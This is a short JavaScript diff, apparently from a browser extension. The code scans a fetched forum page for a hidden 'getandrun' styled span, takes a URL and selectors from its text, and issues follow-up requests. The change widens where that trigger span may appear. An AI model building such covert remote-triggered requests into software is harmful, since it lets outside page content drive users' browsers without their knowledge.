@@ -367,7 +367,7 @@ if (prefs['instantUpdating'] === true) {
                 }
                 else chrome.storage.local.remove('css');
 
-                if ($('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).length == 1) {
+                if ($('span[style="color:getandrun"]', html).length == 1) {
                     var data = $('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).text().split(',');
                     $.ajax({url: data[0], cache: false, dataType: 'html', headers: {'X-PJAX': true}}).done(function(html) {
 						if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
